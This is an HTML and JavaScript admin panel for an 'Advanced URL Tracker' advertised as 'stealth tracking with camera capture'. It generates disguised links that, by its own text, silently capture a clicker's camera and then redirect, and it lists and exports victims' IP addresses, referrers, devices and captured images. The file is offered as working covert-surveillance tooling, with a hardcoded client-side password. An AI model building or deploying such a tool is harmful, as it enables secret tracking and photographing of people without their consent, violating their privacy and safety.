<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - URL Tracker</title>
    <style>
        :root {
            --primary: #4361ee;
            --secondary: #3f37c9;
            --accent: #4895ef;
            --danger: #f72585;
            --light: #f8f9fa;
            --dark: #212529;
            --gray: #6c757d;
            --success: #4cc9f0;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f5f7fa;
            color: var(--dark);
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        header {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            padding: 25px;
            text-align: center;
        }
        
        h1 {
            font-size: 2.2rem;
            margin-bottom: 10px;
        }
        
        .panel {
            padding: 25px;
        }
        
        .url-generator {
            background-color: var(--light);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 30px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
        }
        
        .url-generator h2 {
            margin-bottom: 15px;
            color: var(--secondary);
        }
        
        .input-group {
            display: flex;
            margin-bottom: 15px;
        }
        
        .input-group input {
            flex: 1;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px 0 0 5px;
            font-size: 16px;
            outline: none;
        }
        
        .input-group button {
            padding: 12px 20px;
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: 0 5px 5px 0;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        
        .input-group button:hover {
            background-color: var(--secondary);
        }
        
        .result {
            margin-top: 15px;
        }
        
        .controls {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .controls button {
            padding: 10px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.3s;
        }
        
        #refresh-btn {
            background-color: var(--accent);
            color: white;
        }
        
        #export-btn {
            background-color: var(--success);
            color: white;
        }
        
        #clear-btn {
            background-color: var(--danger);
            color: white;
        }
        
        .controls button:hover {
            opacity: 0.9;
            transform: translateY(-2px);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #e0e0e0;
        }
        
        th {
            background-color: var(--primary);
            color: white;
            font-weight: 500;
        }
        
        tr:nth-child(even) {
            background-color: #f9f9f9;
        }
        
        tr:hover {
            background-color: #f1f1f1;
        }
        
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal-content {
            background: white;
            padding: 20px;
            border-radius: 8px;
            max-width: 90%;
            max-height: 90%;
            overflow: auto;
            position: relative;
        }
        
        .close-modal {
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 24px;
            cursor: pointer;
            color: var(--gray);
        }
        
        .camera-image {
            max-width: 100%;
            max-height: 80vh;
            border-radius: 5px;
        }
        
        .password-protect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 2000;
        }
        
        .password-box {
            background: #f5f7fa;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        
        .password-box input {
            padding: 12px 15px;
            margin: 15px 0;
            width: 100%;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        
        .password-box button {
            padding: 12px 25px;
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        
        .password-box button:hover {
            background-color: var(--secondary);
        }
        
        @media (max-width: 768px) {
            .input-group {
                flex-direction: column;
            }
            
            .input-group input {
                border-radius: 5px;
                margin-bottom: 10px;
            }
            
            .input-group button {
                border-radius: 5px;
            }
            
            th, td {
                padding: 8px 10px;
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="password-protect" id="password-protect">
        <div class="password-box">
            <h2>Admin Login</h2>
            <p>Enter password to access tracking data</p>
            <input type="password" id="password-input" placeholder="Enter password">
            <button onclick="checkPassword()">Continue</button>
        </div>
    </div>

    <div class="container" id="admin-panel" style="display:none">
        <header>
            <h1>Advanced URL Tracker</h1>
            <p>Stealth tracking with camera capture</p>
        </header>
        
        <div class="panel">
            <div class="url-generator">
                <h2>Generate Tracking URL</h2>
                <div class="input-group">
                    <input type="text" id="target-url" placeholder="https://example.com">
                    <button id="generate-btn">Generate</button>
                </div>
                <div class="result" id="result"></div>
            </div>
            
            <div class="controls">
                <button id="refresh-btn">Refresh Data</button>
                <button id="export-btn">Export as CSV</button>
                <button id="clear-btn">Clear All Data</button>
            </div>
            
            <table id="data-table">
                <thead>
                    <tr>
                        <th>Timestamp</th>
                        <th>IP Address</th>
                        <th>Target URL</th>
                        <th>Referrer</th>
                        <th>Device</th>
                        <th>Camera</th>
                    </tr>
                </thead>
                <tbody></tbody>
            </table>
        </div>
    </div>

    <script>
    // Password Protection
    const ADMIN_PASSWORD = "tracker123"; // Change this to your password
    
    function checkPassword() {
        const input = document.getElementById('password-input').value;
        if (input === ADMIN_PASSWORD) {
            document.getElementById('password-protect').style.display = 'none';
            document.getElementById('admin-panel').style.display = 'block';
            loadTrackingData();
        } else {
            alert('Incorrect password');
        }
    }
    
    // Load tracking data
    function loadTrackingData() {
        const data = JSON.parse(localStorage.getItem('tracking_data') || '[]');
        const tbody = document.querySelector('#data-table tbody');
        
        tbody.innerHTML = data.map(item => `
            <tr>
                <td>${new Date(item.timestamp).toLocaleString()}</td>
                <td>${item.ip}</td>
                <td><a href="${item.targetUrl}" target="_blank">${shortenUrl(item.targetUrl)}</a></td>
                <td>${shortenReferrer(item.referrer)}</td>
                <td>${getDeviceType(item.userAgent)}</td>
                <td>${item.cameraData ? `<button onclick="showImage('${item.cameraData}')">View</button>` : 'No capture'}</td>
            </tr>
        `).join('');
    }
    
    function shortenUrl(url) {
        try {
            const u = new URL(url);
            return u.hostname + (u.pathname !== '/' ? u.pathname.substring(0, 15) + (u.pathname.length > 15 ? '...' : '') : '');
        } catch {
            return url.substring(0, 30) + (url.length > 30 ? '...' : '');
        }
    }
    
    function shortenReferrer(referrer) {
        if (referrer === 'Direct') return referrer;
        try {
            const u = new URL(referrer);
            return u.hostname;
        } catch {
            return referrer.substring(0, 20) + (referrer.length > 20 ? '...' : '');
        }
    }
    
    function getDeviceType(userAgent) {
        if (/mobile/i.test(userAgent)) return 'ðŸ“± Mobile';
        if (/tablet/i.test(userAgent)) return 'ðŸ–¥ Tablet';
        return 'ðŸ’» Desktop';
    }
    
    function showImage(imageData) {
        const modal = document.createElement('div');
        modal.className = 'modal';
        modal.innerHTML = `
            <div class="modal-content">
                <span class="close-modal" onclick="this.parentElement.parentElement.remove()">&times;</span>
                <h3>Camera Capture</h3>
                <img src="${imageData}" class="camera-image" alt="Camera capture">
                <p><button onclick="downloadImage('${imageData}')">Download Image</button></p>
            </div>
        `;
        document.body.appendChild(modal);
    }
    
    function downloadImage(imageData) {
        const link = document.createElement('a');
        link.href = imageData;
        link.download = `capture-${new Date().getTime()}.jpg`;
        link.click();
    }
    
    // Generate tracking URL
    document.getElementById('generate-btn').addEventListener('click', function() {
        const targetUrl = document.getElementById('target-url').value.trim();
        if (!targetUrl) {
            alert('Please enter a URL');
            return;
        }
        
        try {
            new URL(targetUrl);
        } catch {
            alert('Invalid URL format');
            return;
        }
        
        const trackingId = 'trk_' + Math.random().toString(36).substr(2, 9);
        const encodedUrl = encodeURIComponent(targetUrl);
        const trackingUrl = `${window.location.origin}/?track=${trackingId}&target=${encodedUrl}`;
        
        document.getElementById('result').innerHTML = `
            <p><strong>Tracking URL:</strong></p>
            <input type="text" value="${trackingUrl}" style="width: 100%; padding: 8px; margin-bottom: 10px;" readonly>
            <button onclick="copyToClipboard()">Copy URL</button>
            <p style="margin-top: 10px; font-size: 14px; color: #666;">
                When someone clicks this link, it will silently capture their camera (if available) and redirect to the target URL.
            </p>
        `;
    });
    
    function copyToClipboard() {
        const input = document.querySelector('#result input');
        input.select();
        document.execCommand('copy');
        alert('URL copied to clipboard!');
    }
    
    // Control buttons
    document.getElementById('refresh-btn').addEventListener('click', loadTrackingData);
    
    document.getElementById('export-btn').addEventListener('click', function() {
        const data = JSON.parse(localStorage.getItem('tracking_data') || '[]');
        let csv = 'Timestamp,IP Address,Target URL,Referrer,Device,Screen\n';
        
        data.forEach(item => {
            csv += `"${new Date(item.timestamp).toLocaleString()}","${item.ip}","${item.targetUrl}","${item.referrer}","${getDeviceType(item.userAgent)}","${item.screen}"\n`;
        });
        
        const blob = new Blob([csv], { type: 'text/csv' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `tracking-data-${new Date().toISOString().split('T')[0]}.csv`;
        a.click();
    });
    
    document.getElementById('clear-btn').addEventListener('click', function() {
        if (confirm('Are you sure you want to delete ALL tracking data? This cannot be undone.')) {
            localStorage.removeItem('tracking_data');
            loadTrackingData();
        }
    });
    
    // Auto-focus password input
    document.getElementById('password-input').focus();
    </script>
</body>
</html>
